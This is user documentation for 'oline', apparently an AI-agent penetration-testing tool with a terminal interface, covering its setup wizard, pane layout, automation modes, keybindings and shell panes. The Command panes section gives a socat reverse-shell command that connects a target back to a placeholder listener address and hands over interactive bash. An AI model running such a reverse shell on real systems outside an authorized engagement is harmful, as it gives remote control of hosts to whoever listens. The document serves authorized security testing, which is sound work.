# The interface

oline is a full-screen keyboard-and-mouse TUI: a setup wizard, then the running view.

## Splash screen

With Sixel support oline shows the logo as a Sixel splash, otherwise an ANSI one.
Force it with `OLINE_SIXEL=1` / `OLINE_SIXEL=0`.

## Setup wizard

The wizard asks each setting in order, skipping steps that don't apply; Enter advances.

1. **Mode**: pentester or exploiter.
2. **Models**: on the first run (no provider yet), a form defining one: provider
   name, base URL, API key, and a model per tier (`big`, `medium`, `small`) with its
   id, context window, max tokens, reasoning flag, and prices. Fields are prefilled
   with an OpenAI example; medium and small can reuse the tier above. Saved for later
   runs (which skip this, or show a short picker when a provider exists but the tiers
   are unset). Up/down or Tab move, left/right or Space toggle, Enter saves.
3. **API key**: shown only when a chosen model's provider has no key. Saved to `secrets.yml`.
4. **Start**: new engagement or resume.
5. **Environment**: pick a sandbox. Lists WSL distros and QEMU images, plus "create
   new". See [sandbox.md](sandbox.md).
6. **Resume / import**: pick an existing engagement or import one from a host
   archive, then choose whether to load its history.
7. **Scope**: pentester, the in-scope targets as free text (IPs, CIDRs, and domains
   parsed out; IPs and CIDRs drive the firewall, domains feed tool checks and
   reporting). Exploiter, the application to analyze (a local path, or a URL/name for
   the installer to fetch); agents stay network-isolated either way.
8. **Goal**: what the engagement should achieve. When resuming, the saved goal is
   kept and this step takes optional extra instructions instead (blank to skip).
9. **VPN** (optional, WSL only): an OpenVPN config the sandbox connects through
   before agents start.
10. **Automation**: automatic, planner, or watcher (see [Modes](#modes)); switch
    later with `Ctrl-b m`.

## Running view

The default layout tiles panes like tmux:

```
+----------------------+------------------+-------------------+
|                      |  summary         |  Options pane     |
|  orchestrator        |  (live)          |  (roster + help)  |
|  transcript          +------------------+                   |
|                      |  diagram         |                   |
|                      |  (live)          |                   |
+----------------------+------------------+-------------------+
|  scope / status bar                                         |
|  command line                                               |
+-------------------------------------------------------------+
```

- The left pane follows the orchestrator.
- The center stacks two read-only panes:
  - **Summary** (top): the orchestrator's state of play, in Markdown. `Ctrl-b s`
    refreshes it and the Diagram now.
  - **Diagram** (bottom): an ASCII map the orchestrator draws (a network map in
    pentester mode, a component map in exploiter). `Ctrl-b d` refreshes just it.
    Shown verbatim in monospace; wide lines are clipped, so zoom (`Ctrl-b z`) to read
    a large map.

  Focus an agent to type a message; the info panes are read-only.
- The right **Options** pane (`Ctrl-b ?` toggles) shows the choices for the active
  tab: info views on the Info tab, subagents on the Subagents tab, command panes on a
  Shell tab (all of them in customizable mode). Each agent row shows its state,
  context-window use, and, for a running agent with a budget, the time left.
- Click a row or arrow onto it to show it in the focused pane (also how you reopen a
  closed Summary or Diagram).
- A subagent's pane opens with the task the orchestrator gave it; scroll up to read it.
- The status bar shows the roster, scope, environment, mode, and concurrency.
- The command line messages the focused agent; a focused shell pane runs it instead.

Markdown renders as it streams. Thoughts are hidden by default (`Ctrl-b t`). Click a
tool call to expand its command and output.

### Mouse

- Click a pane to focus it; click a tool call to expand or collapse it.
- Click a header tab to switch windows.
- Drag a pane border to resize; drag one pane onto another to swap them.
- The wheel scrolls the pane under the cursor (the roster when over the Options pane).

## Modes

Shown in the status bar; pick one in the wizard, switch anytime with `Ctrl-b m`
(cycles automatic to planner to watcher). The change applies at once and the AI is told.

- **Automatic**: the AI runs end to end, pausing only for its gates (destructive
  actions, scope ambiguity, uncertainty).
- **Planner**: the AI proposes each step and waits for your explicit approval, one
  step at a time.
- **Watcher**: you run everything; the AI executes nothing (`bash`, `bash_bg`,
  `revshell`, and custom tools are hard-blocked for every agent). It watches, keeps
  notes, and advises, and may still read and write the workspace. It does not read
  your terminals on its own: `Ctrl-b a` shares the focused pane's current content with
  the orchestrator (works in any mode).

## Keybindings

Press `Ctrl-b`, then one of these keys:

| key | action |
|---|---|
| `%` / `\|` | split the focused pane across |
| `"` / `-` | split the focused pane down |
| arrows / `hjkl` | move between panes |
| `o` | cycle panes |
| `g` / `G` | jump the focused pane to the top / bottom |
| `z` | zoom the focused pane |
| `x` | close the focused pane |
| `$` | open a shell pane (line-oriented) |
| `T` | open a fully terminal-emulated pane (vim/htop work) |
| `L` | open a fully-emulated reverse-shell catcher (enter a port) |
| `[` | copy mode |
| `c` | new window (tab) |
| `n` | next window |
| `1`-`9`, `0` | jump to window N (`0` is window 10) |
| `&` | close the current window |
| `p` / `P` | pause the focused agent / all agents |
| `r` / `R` | resume the focused agent / all agents |
| `K` | kill the focused agent, or a command pane's backing process |
| `S` | stop the focused agent's (or shell's) running command |
| `s` / `d` | refresh the Summary and Diagram / just the Diagram |
| `t` | toggle agent thoughts |
| `m` | cycle the operating mode |
| `a` | share the focused pane's content with the AI |
| `b` | change the focused agent's time budget |
| `e` | open the settings editor |
| `?` | show or hide the Options pane |
| `q` | quit |

Without the prefix: up/down move the selection through the Options list, the wheel
scrolls the transcript, and typing plus Enter messages the focused agent (or runs it
in a focused shell pane).

### Windows (tabs)

`Ctrl-b c` opens a window, `Ctrl-b n` cycles, `Ctrl-b 1`-`9` jump by number, and
`Ctrl-b &` closes the current one (not the last). A tab strip appears in the header
when more than one window exists.

By default the tabs have fixed identities that limit which panes they hold, and the
Options sidebar shows only that tab's choices:

- **Info** (tab 1): orchestrator, Summary, Diagram.
- **Subagents** (tab 2): subagent panes, auto-arranged (below).
- **Shell** (tab 3+, and new windows): command panes; starts with one shell pane.

You can resize, split, and switch a pane's view on any tab, but can't move a
different category onto a tab (a subagent onto Info, say). The Info and Subagents
tabs can't be closed. Turn on **Customizable Panes** (below) for free-form numeric
tabs with none of these restrictions.

#### The Subagents auto-layout

The first subagent fills one pane; the second splits it left/right; the third splits
the left pane top/bottom; the fourth splits the right. Beyond four, each new subagent
takes over the pane showing the oldest subagent. Resizing, splitting, and switching a
pane's subagent don't stop it; the next spawn still replaces the oldest.

### Command panes

`Ctrl-b $` opens a line-oriented shell pane that runs as root, keeping its working
directory across commands (`Ctrl-b S` stops a running one). The egress firewall
restricts agents, not your shell.

`Ctrl-b T` opens a fully terminal-emulated pane: a real PTY in the sandbox driven by
a VT emulator, so vim, htop, less, and tmux work. Every keystroke goes to the program
except `Ctrl-b`, the prefix (press it twice to send a literal `Ctrl-b`). It resizes
with the layout (live on QEMU, fixed at open on WSL), and needs `script` on WSL (QEMU
uses the SSH PTY).

`Ctrl-b L` asks for a port and opens a terminal pane that listens for a reverse shell
with a PTY on both ends (via `socat`), so a caught shell is a real terminal. Connect
back with, for example:

```
socat tcp:<your-ip>:<port> exec:'bash -li',pty,stderr,setsid,sigint,sane
```

`socat` must be installed in the sandbox.

When an agent opens a `revshell` channel it appears as a `⇄` row (name and port);
click it to open a pane that streams the channel and sends what you type to the
connected shell. The agents open and close the listener; closing the pane leaves it
running.

### Pause, resume, kill

`Ctrl-b p` / `r` pause and resume the focused agent (pausing cancels its model stream
and running command); `Ctrl-b P` / `R` do all agents and stop/allow new spawns.
`Ctrl-b K` kills the focused agent, or, on a command pane, kills its backing process
(terminal PTY, channel listener, or shell command) and closes the pane.

### Copy mode

`Ctrl-b [` shows the focused transcript as plain full-screen text to select and copy;
arrows, PgUp, PgDn, and the wheel scroll, Esc exits.

### Settings editor

`Ctrl-b e` lists scope, a `tui` settings item, the model tiers, providers, and every
agent plus the orchestrator's `system prompt` / `personality` / (pentester)
`methodology`. Enter edits an item; `Tab` and `↑/↓` move between fields and the prompt
box, `alt+↑/↓` resize it, `Ctrl+S` saves. Editing **scope** live re-applies the
firewall and notifies the orchestrator. The **customizable panes** setting, off by
default, drops the fixed tabs and auto-layout for free-form numeric tabs (applies next
engagement). See [configuration.md](configuration.md#the-in-app-editor).

### Change a time budget

Focus an agent, press `Ctrl-b b`, and type minutes (or `none`). See [agents.md](agents.md).
